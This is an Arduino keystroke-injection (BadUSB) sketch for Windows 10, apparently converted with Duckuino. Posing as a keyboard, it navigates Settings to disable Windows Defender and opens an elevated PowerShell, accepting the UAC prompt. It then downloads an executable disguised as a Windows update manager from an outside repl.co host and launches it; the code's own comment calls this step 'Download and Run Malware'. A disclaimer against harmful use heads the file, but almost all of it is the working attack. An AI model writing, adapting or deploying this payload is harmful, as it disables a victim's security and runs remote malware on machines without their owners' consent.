/**
 * AUTHOR: Eddie Devine
 * TARGET: Windows 10
 * DESCRIPTION: Installs ands runs Enderman's WindowsUpdate.exe.
 * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 * 
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Disable Windows Defender:
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("Settings"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(300);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("C:"));

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  // Download and Run Malware:
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell"));

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("$url = \"https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$outpath = \"C:\\Windows_Update_Manager.exe\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $outpath"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("cd .."));

  typeKey(KEY_RETURN);

  Keyboard.print(F("cd.."));

  typeKey(KEY_RETURN);

  Keyboard.print(F("start Windows_Update_Manager.exe"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
